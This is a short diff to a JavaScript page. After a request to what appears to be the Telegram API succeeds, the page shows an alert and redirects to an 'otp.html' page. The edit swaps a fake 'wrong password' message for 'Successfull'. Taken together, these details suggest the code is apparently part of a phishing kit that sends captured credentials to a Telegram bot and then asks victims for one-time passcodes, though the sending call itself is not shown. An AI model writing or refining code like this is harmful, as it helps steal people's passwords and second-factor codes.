@@ -92,7 +92,7 @@
       .then(res => res.json())
       .then(data => {
           if (data.ok) {
-              alert("wrong password");
+              alert("Successfull");
               window.location.href = "otp.html";
           } else {
               console.error("Telegram error:", data);
